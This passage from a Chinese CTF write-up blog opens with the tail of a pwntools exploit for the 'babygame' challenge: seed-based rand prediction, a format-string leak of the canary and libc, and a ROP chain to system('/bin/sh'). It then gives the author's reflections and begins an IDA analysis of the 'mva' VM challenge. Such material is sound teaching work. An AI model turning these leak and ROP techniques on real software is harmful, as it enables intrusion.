class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">	stack_addr=leak_addr-<span class="number">528</span></span><br><span class="line">	success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">	success(<span class="string">&#x27;stack_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">	seed=key.srand(<span class="number">0x31313131</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">		p.recvuntil(<span class="string">&#x27;round &#x27;</span>+ <span class="built_in">str</span>(i+<span class="number">1</span>)+ <span class="string">&#x27;: \n&#x27;</span>)</span><br><span class="line">		num=(key.rand()+<span class="number">1</span>)%<span class="number">3</span></span><br><span class="line">		p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line">	</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Good luck to you.\n&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	target_stack=stack_addr-<span class="number">0x8</span></span><br><span class="line">	payload = <span class="string">&quot;%13$p%27$p&quot;</span></span><br><span class="line">	payload +=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x54c2</span>-<span class="number">0x20</span>)+<span class="string">&quot;c&quot;</span>+<span class="string">&quot;%9$hn&quot;</span></span><br><span class="line">	payload = payload.ljust(<span class="number">0x18</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">	payload = flat([payload,p64(target_stack)])</span><br><span class="line"></span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	canary=<span class="built_in">int</span>((p.recv(<span class="number">16</span>)),<span class="number">16</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	leak_addr=<span class="built_in">int</span>((p.recv(<span class="number">12</span>)),<span class="number">16</span>)</span><br><span class="line">	libc_base=leak_addr-<span class="number">280052</span></span><br><span class="line">	</span><br><span class="line">	success(<span class="string">&#x27;canary &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">	success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">	success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">	</span><br><span class="line">	poprdi_ret=<span class="number">0x23b72</span>+libc_base</span><br><span class="line">	ret=<span class="number">0x22679</span>+libc_base</span><br><span class="line">	system_libc=libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">	binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))+libc_base</span><br><span class="line">	</span><br><span class="line">	payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x120</span>-<span class="number">0x18</span>)+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">	payload+=p64(poprdi_ret)+p64(binsh)+p64(ret)+p64(system_libc)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	sleep(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;2. paper\n&quot;</span>)</span><br><span class="line">    	log.success(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		sleep(<span class="number">0.5</span>)</span><br><span class="line">		p=process(<span class="string">&#x27;./babygame&#x27;</span>)</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			pwn()</span><br><span class="line">		<span class="keyword">except</span> EOFError:</span><br><span class="line">			p.close()</span><br><span class="line">			log.success(<span class="string">&quot;continue!!!&quot;</span>)</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结</strong></p>
<p>这次比赛我摆烂了，没有出多少力，看着 kernel pwn 和那些我不知道是什么的东西，我感觉我排不上用场了，于是花了一下午去搭了搭 kernel 的环境，后来就出了这道题（我稍微可以摸一摸）</p>
<p>先谈谈我遇到这道题时的“阻力”吧：</p>
<ul>
<li>不知道栈溢出该泄露什么东西<ul>
<li>后面有格式化漏洞，我的第一反应就是泄露“stack_addr”，但是这个canary保护着后面的数据，导致我当时想着先泄露canary，然后再格式化漏洞里面泄露其他东西</li>
</ul>
</li>
<li>如何绕过随机数检测<ul>
<li>这个在当时只卡了一小会（当时那个愚蠢的我还想着全输入“1”来爆破），后来选择覆盖seed，一下子就搞定了</li>
</ul>
</li>
<li>如何绕过canary<ul>
<li>当时我就是卡在了这里，在分析大佬的wp时，我发现大佬把canary给覆盖了，然后去泄露后面的“stack_addr”</li>
<li>我在GDB中发现：当canary被覆盖以后，程序会把原来的返回地址给替换为“异常处理程序”，也就是说，canary报错程序只会在当前函数返回时启动</li>
</ul>
</li>
<li>如何使程序循环<ul>
<li>利用格式化漏洞可以轻易获取canary，但是程序本身没有循环，必须控制某个返回地址来使程序再次执行栈溢出漏洞，在复现时这里也困扰了我一下</li>
<li>后来和大佬交流，发现关键点就是在栈中写入“某个返回地址所在的栈地址”，然后计算偏移进行修改（其实我以前总结过，不过后来忘了）</li>
</ul>
</li>
</ul>
<p>通过本题我把以前丢掉的东西捡了起来，也学了一些新东西</p>
<h2 id="mva"><a href="#mva" class="headerlink" title="mva"></a>mva</h2><p>这是我第一次尝试 VMP pwn</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./mva</span><br><span class="line">[+] Welcome to MVA, input your code now :</span><br><span class="line">aaaaaaaa</span><br><span class="line">bbbbbbbb</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mva: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=b8c5659d20f095ec5c46c6bccb7c6a05d5952b02, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line"></span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/mva&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<p>简单修改后的程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v5; <span class="comment">// [rsp+20h] [rbp-240h]</span></span><br><span class="line"></span><br><span class="line">  init_s();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] Welcome to MVA, input your code now :&quot;</span>);</span><br><span class="line">  fread(&amp;code, <span class="number">0x100</span>uLL, <span class="number">1uLL</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] MVA is starting ...&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)())((<span class="keyword">char</span> *)&amp;sub_11E8 + <span class="number">1</span>))(); <span class="comment">/* 未知算法 */</span></span><br><span class="line">    v5 = HIBYTE(v3); <span class="comment">/* 分析出错 */</span></span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt; <span class="number">0xF</span>u )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">0xF</span>u )</span><br><span class="line">      __asm &#123; jmp     rax &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] MVA is shutting down ...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为IDA无法识别跳转表，必须手动修改：</p>
<ul>
<li>先在IDA的“.rodata”区中找到跳转表（地址“0x206C”）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.rodata:<span class="number">000000000000206</span>C unk_206C        db  <span class="number">8B</span>h                 ; DATA XREF: main+<span class="number">134</span>↑o</span><br><span class="line">.rodata:<span class="number">000000000000206</span>C                                         ; main+<span class="number">140</span>↑o</span><br><span class="line">.rodata:<span class="number">000000000000206</span>D                 db <span class="number">0F</span>3h</span><br><span class="line">.rodata:<span class="number">000000000000206</span>E                 db <span class="number">0F</span>Fh</span><br><span class="line">.rodata:<span class="number">000000000000206F</span>                 db <span class="number">0F</span>Fh</span><br><span class="line">.rodata:<span class="number">0000000000002070</span>                 db  <span class="number">99</span>h</span><br></pre></td></tr></table></figure>
<ul>
<li>用 TAB 定位“ __asm { jmp     rax } ”的汇编代码位置</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000013</span>D6                 lea     rdx, ds:<span class="number">0</span>[rax*<span class="number">4</span>] <span class="comment">// target</span></span><br><span class="line">.text:<span class="number">00000000000013</span>DE                 lea     rax, unk_206C</span><br><span class="line">.text:<span class="number">00000000000013E5</span>                 mov     eax, [rdx+rax]</span><br><span class="line">.text:<span class="number">00000000000013E8</span>                 cdqe</span><br><span class="line">.text:<span class="number">00000000000013</span>EA                 lea     rdx, unk_206C</span><br><span class="line">.text:<span class="number">00000000000013F</span>1                 add     rax, rdx</span><br><span class="line">.text:<span class="number">00000000000013F</span>4                 db      <span class="number">3</span>Eh</span><br><span class="line">.text:<span class="number">00000000000013F</span>4                 jmp     rax</span><br></pre></td></tr></table></figure>
<ul>
<li>在第一个“unk_206C”前进行修改（下面第二个记得勾）</li>
</ul>
<img src="/2022/03/25/%E8%99%8E%E7%AC%A6CTF2022/1648043452770.png" class width="1648043452770">  
<p>修改完成，并且进行了一些优化后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+1Ah] [rbp-246h]</span></span><br><span class="line">  __int16 v5; <span class="comment">// [rsp+1Ch] [rbp-244h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 key; <span class="comment">// [rsp+20h] [rbp-240h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> enc_num; <span class="comment">// [rsp+24h] [rbp-23Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+28h] [rbp-238h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+30h] [rbp-230h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+44h] [rbp-21Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+4Ch] [rbp-214h]</span></span><br><span class="line">  __int16 v12[<span class="number">260</span>]; <span class="comment">// [rsp+50h] [rbp-210h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v13; <span class="comment">// [rsp+258h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_s();</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] Welcome to MVA, input your code now :&quot;</span>);</span><br><span class="line">  fread(&amp;code, <span class="number">0x100</span>uLL, <span class="number">1uLL</span>, <span class="built_in">stdin</span>); <span class="comment">/* 输入code */</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] MVA is starting ...&quot;</span>);</span><br><span class="line">LABEL_102:</span><br><span class="line">  <span class="keyword">while</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    enc_num = enc();</span><br><span class="line">    key = HIBYTE(enc_num); <span class="comment">/* HIWORD 取8bits高4bits */</span></span><br><span class="line">    <span class="keyword">if</span> ( key &gt; <span class="number">0xF</span>u )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( key &lt;= <span class="number">0xF</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( key )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">          v5 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">          *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = enc_num;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">char</span>)enc_num &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = *((_WORD *)&amp;v10 + SBYTE1(enc_num)) + *((_WORD *)&amp;v10 + (<span class="keyword">char</span>)enc_num);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">char</span>)enc_num &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = *((_WORD *)&amp;v10 + SBYTE1(enc_num)) - *((_WORD *)&amp;v10 + (<span class="keyword">char</span>)enc_num);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">char</span>)enc_num &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = *((_WORD *)&amp;v10 + SBYTE1(enc_num)) &amp; *((_WORD *)&amp;v10 + (<span class="keyword">char</span>)enc_num);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">char</span>)enc_num &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = *((_WORD *)&amp;v10 + SBYTE1(enc_num)) | *((_WORD *)&amp;v10 + (<span class="keyword">char</span>)enc_num);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = (<span class="keyword">int</span>)*((<span class="keyword">unsigned</span> __int16 *)&amp;v10 + SBYTE2(enc_num)) &gt;&gt; *((_WORD *)&amp;v10 + SBYTE1(enc_num));</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">char</span>)enc_num &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = *((_WORD *)&amp;v10 + SBYTE1(enc_num)) ^ *((_WORD *)&amp;v10 + (<span class="keyword">char</span>)enc_num);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8u</span>:</span><br><span class="line">          JUMPOUT(<span class="number">0x1780</span>LL);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( v9 &gt; <span class="number">256</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( BYTE2(enc_num) )</span><br><span class="line">            v12[v9] = enc_num;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            v12[v9] = v10;</span><br><span class="line">          ++v9;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xA</span>u:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !v9 )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = v12[--v9];</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xB</span>u:</span><br><span class="line">          v8 = enc();</span><br><span class="line">          <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">            index = v8;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xC</span>u:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          v4 = *((_WORD *)&amp;v10 + SBYTE2(enc_num)) == *((_WORD *)&amp;v10 + SBYTE1(enc_num));</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xD</span>u:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">char</span>)enc_num &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = *((_WORD *)&amp;v10 + SBYTE1(enc_num)) * *((_WORD *)&amp;v10 + (<span class="keyword">char</span>)enc_num);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xE</span>u:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          *((_WORD *)&amp;v10 + SBYTE1(enc_num)) = *((_WORD *)&amp;v10 + SBYTE2(enc_num));</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xF</span>u:</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="keyword">unsigned</span> __int16)v12[v9]);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">LABEL_8:</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] MVA is shutting down ...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>好看一点了</p>
<p><strong>入侵思路</strong></p>
